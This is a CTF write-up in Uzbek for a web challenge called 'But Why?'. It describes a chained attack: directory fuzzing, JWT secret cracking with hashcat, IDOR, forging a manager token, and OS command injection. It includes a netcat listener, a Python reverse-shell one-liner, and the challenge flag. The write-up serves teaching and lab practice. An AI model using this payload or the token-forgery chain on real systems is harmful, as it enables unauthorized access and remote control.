# But Why?

| Field | Value |
|-------|-------|
| Category | Web |
| Points | ? |

## Description

> (Challenge description unavailable — provided to players via CTFd.)
>
> A web application with multiple chained vulnerabilities.

## Solution

# CTF Writeup: But Why?

> **Kategoriya:** Web  
> **Qiyinlik:** Medium  

---

## Umumiy Ko'rinish

Bu challenge bir nechta zaifliklarni o'z ichiga oladi:
- Directory fuzzing orqali maxfiy ma'lumotlarni topish
- JWT token brute-force
- IDOR (Insecure Direct Object Reference)
- JWT forgery (soxtalashtirish)
- OS Command Injection → Reverse Shell

---

<img width="1683" height="924" alt="1" src="https://github.com/user-attachments/assets/de6a5737-0f34-451f-bb44-7a53a6217b46" />

## 1. Reconnaissance — Directory Fuzzing

Birinchi qadam sifatida saytda yashirin fayllarni topish uchun `gobuster` dan foydalanamiz:

```bash
gobuster dir -u http://192.168.68.178/ -w /usr/share/wordlists/dirb/common.txt -x txt
```

**Natija:** `note.txt` fayli topildi. Faylni analiz qilish natijasida quyidagi ma'lumotlar aniqlandi:

- **Username:** `turandev`
- **Password:** `turandev!@#`

Ushbu credentials yordamida veb saytga muvaffaqiyatli autentifikatsiyadan o'tdik.

<img width="599" height="321" alt="2" src="https://github.com/user-attachments/assets/1102f0f2-fd87-4640-b236-75ee6e41c0da" />

---

## 2. Dashboard — Cheklangan Ruxsatlar (Privilege Issue)

Dashboard'da Pingvinga xabar yuborish funksiyasi mavjudligi aniqlandi. Biroq, joriy foydalanuvchimizning (`turandev`) huquqlari yetarli emas — bu funksiya faqat yuqori roli bo'lgan foydalanuvchilar uchun ochiq.

**Maqsad:** Yuqori huquqli foydalanuvchi sifatida tizimga kirish.

<img width="1688" height="930" alt="3" src="https://github.com/user-attachments/assets/fb31d6a4-a492-43da-b17a-b57eee9e2249" />

---

## 3. JWT Token Brute-Force

Brauzerning `localStorage`-dan JWT token olindi. Tokenni `hashcat` yordamida brute-force qilamiz:

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Natija:** JWT ning `secret key` muvaffaqiyatli topildi.

<img width="1643" height="673" alt="4" src="https://github.com/user-attachments/assets/0908ff54-f3f0-488f-ba1a-2de56fd0ab91" />
<img width="1656" height="541" alt="5" src="https://github.com/user-attachments/assets/b4534189-7f6f-4fec-a07f-862800ad8b1d" />

---

## 4. JWT Payload — MD5 Hash Cracking

JWT payload ichidagi `user_id` maydoni MD5 hash ekanligini aniqladik. Uni `CrackStation` yordamida crack qildik:

🔗 [https://crackstation.net/](https://crackstation.net/)

**Natija:** Foydalanuvchi ID si ochiq ko'rinishda (plaintext) olindi.

<img width="1093" height="360" alt="6" src="https://github.com/user-attachments/assets/2ea1ecef-471c-4c8d-ab58-41b3f318e8c3" />

---

## 5. IDOR — `/me` Endpoint orqali Boshqa Foydalanuvchilarning Ma'lumotlari

Fuzzing jarayonida `/me` endpointi topildi. Ushbu endpoint'ga `user_id` parametrini MD5 hash ko'rinishida yuborishda **IDOR zaiflikni** aniqladik — ya'ni boshqa foydalanuvchilarning ma'lumotlarini ham olish mumkin:

```
GET /me?user_id=<md5_hash>
```

Javoblar o'rganilganda **roli `manager`** bo'lgan `NavkarX` foydalanuvchisi aniqlandi.

<img width="1066" height="367" alt="7" src="https://github.com/user-attachments/assets/0b3ec25b-5929-480b-84fd-859c43cc0b19" />

---

## 6. JWT Forgery — Manager Tokenini Yaratish

Bizda JWT ning `secret key` mavjud bo'lganligi uchun `NavkarX` (manager) foydalanuvchisi uchun yangi JWT token yasadik:

🔗 [https://supertokens.com/jwt-encoder-decoder](https://supertokens.com/jwt-encoder-decoder)

Token payload'iga `NavkarX`-ning `user_id` va `role: manager` qiymatlarini joylashtirib, secret key bilan imzoladik.

<img width="1162" height="753" alt="8" src="https://github.com/user-attachments/assets/75f35df7-7e10-4667-b13f-a2c01f8c959a" />

---

## 7. Manager Sifatida Kirish

Yaratilgan yangi JWT tokenni `localStorage`-ga o'rnatib, sahifani yangilaganimizda `NavkarX` foydalanuvchisi sifatida tizimga kirdik.

**Natija:** Pingvinga xabar yuborish funksiyasidan foydalanish mumkin!

<img width="1686" height="888" alt="9" src="https://github.com/user-attachments/assets/0078d3fa-a367-408c-af32-5a24f8f22e7f" />

---

## 8. OS Command Injection → Reverse Shell

Xabar yuborish maydonida **OS Command Injection** zaiflikni aniqladik. Netcat orqali listener ochib, reverse shell olamiz:

**Listener (attacker machine):**
```bash
nc -lvnp 5555
```

**Payload (input maydoniga):**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.68.178",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

**Natija:** Muvaffaqiyatli reverse shell olindi! 🎉

<img width="1681" height="927" alt="10" src="https://github.com/user-attachments/assets/82ec20c3-b8b1-483a-8e76-b599cec3392b" />

<img width="658" height="240" alt="11" src="https://github.com/user-attachments/assets/55b04efb-62ff-484e-800e-c43dccd2a314" />

---

## Attack Chain Xulosa

```
Directory Fuzzing (gobuster)
        ↓
Credentials topish (note.txt)
        ↓
Web saytga login
        ↓
JWT Token olish (localStorage)
        ↓
JWT Brute-Force (hashcat)  →  Secret Key topildi
        ↓
IDOR (/me endpoint)  →  Manager foydalanuvchisi aniqlandi
        ↓
JWT Forgery  →  Manager sifatida login
        ↓
OS Command Injection  →  Reverse Shell 🐚
```

---

*Writeup by: Turan Security | CTF: But Why?*


## Flag

`CHC{jwt_1dor_rce_full_ch4in}`
